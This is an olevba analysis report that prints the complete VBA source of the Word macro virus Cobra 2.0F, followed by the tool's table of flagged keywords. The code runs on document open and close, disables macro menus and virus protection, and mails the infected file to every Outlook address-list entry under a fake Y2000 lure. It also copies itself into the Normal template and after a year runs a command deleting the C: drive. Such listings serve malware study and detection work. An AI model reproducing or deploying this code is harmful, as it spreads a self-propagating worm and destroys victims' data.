olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.p-d83748f89fb577a3e3928c942451036d5aad2719
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.p-d83748f89fb577a3e3928c942451036d5aad2719 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewCobra.bas 
in file: Virus.MSWord.Cobra.p-d83748f89fb577a3e3928c942451036d5aad2719 - OLE stream: 'Macros/VBA/NewCobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0F

Sub AutoOpen()
Call CobA
Call CobB
Call CobC
End Sub
Sub AutoClose()
Call CobA
Call CobB
Call CobC
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Sub FileNew()
Call CobA
Call CobB
Call CobC
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileOpen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call CobA
Call CobB
Call CobC
End Sub
Sub FileClose()
On Error Resume Next
Call CobA
Call CobB
Call CobC
If ActiveDocument.Saved = False Then ActiveDocument.Save
WordBasic.FileClose
End Sub
Sub FileExit()
On Error Resume Next
Call CobA
Call CobB
Call CobC
If ActiveDocument.Saved = False Then ActiveDocument.Save
WordBasic.FileExit
End Sub
Sub FileSaveAs()
On Error Resume Next
Call CobA
Call CobB
Call CobC
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub CobA()
On Error Resume Next
Dim u, d, b
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") <> "LITON VS Cobra" Or _
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") <> "349,(PA12A19H2AG)/DHK/BD" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Cobra", "Inf") = Format(Date, "mm/dd/yyyy")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "LITON VS Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "349,(PA12A19H2AG)/DHK/BD"
End If
Set u = CreateObject("Outlook.Application")
Set d = u.GetNameSpace("MAPI")
d.Logon "profile", "password"
AdLC = d.AddressLists.Count
For l = 1 To AdLC
Set a = d.AddressLists(l)
i = 1
Set b = u.CreateItem(0)
AdEC = a.AddressEntries.Count
For t = 1 To AdEC
o = a.AddressEntries(i)
b.Recipients.Add o
i = i + 1
Next t
b.Subject = "Important message about Y2000 from " _
& Application.UserName
b.Attachments.Add ActiveDocument.FullName
b.Body = "Important documment;-"
b.Send
o = ""
Next l
d.LogOff
End Sub
Sub CobB()
On Error Resume Next
Set AD = ActiveDocument
Set NT = NormalTemplate
ac = False: nc = False
For i = 1 To NT.VBProject.VBComponents.Count
If NT.VBProject.VBComponents(i).Name <> "ThisDocument" And _
NT.VBProject.VBComponents(i).Name <> "NewCobra" Then
Application.OrganizerDelete Source:=NT.FullName, _
Name:=NT.VBProject.VBComponents(i).Name, _
Object:=wdOrganizerObjectProjectItems
End If
Next
For i = 1 To AD.VBProject.VBComponents.Count
If AD.VBProject.VBComponents(i).Name <> "ThisDocument" And _
AD.VBProject.VBComponents(i).Name <> "Reference to Normal" And _
AD.VBProject.VBComponents(i).Name <> "NewCobra" Then
Application.OrganizerDelete Source:=AD.FullName, _
Name:=AD.VBProject.VBComponents(i).Name, _
Object:=wdOrganizerObjectProjectItems
End If
Next
For i = 1 To AD.VBProject.VBComponents.Count
If AD.VBProject.VBComponents(i).Name = "NewCobra" Then
ac = True
End If
Next
For i = 1 To NT.VBProject.VBComponents.Count
If NT.VBProject.VBComponents(i).Name = "NewCobra" Then
nc = True
End If
Next
If ac = True And nc = False Then
Application.OrganizerCopy Source:=AD.FullName, _
Destination:=NT.FullName, Name:="NewCobra", _
Object:=wdOrganizerObjectProjectItems
End If
If ac = False And nc = True Then
Application.OrganizerCopy Source:=NT.FullName, _
Destination:=AD.FullName, Name:="NewCobra", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub CobC()
On Error Resume Next
CIFDT = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Cobra", "Inf")
CURDT = Format(Date, "mm/dd/yyyy")
TOTDT = DateValue(CURDT) - DateValue(CIFDT)
If TOTDT > 365 And (WeekDay(Now) = 6 Or WeekDay(Now) = 1) Then
MsgBox "I am a new virus. " + Chr(13) + "Now, I am deleting you file(s)." + Chr(13) + "Please wait....""", vbOKOnly + vbExclamation, "AAX"
Shell "Deltree /y C:\"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

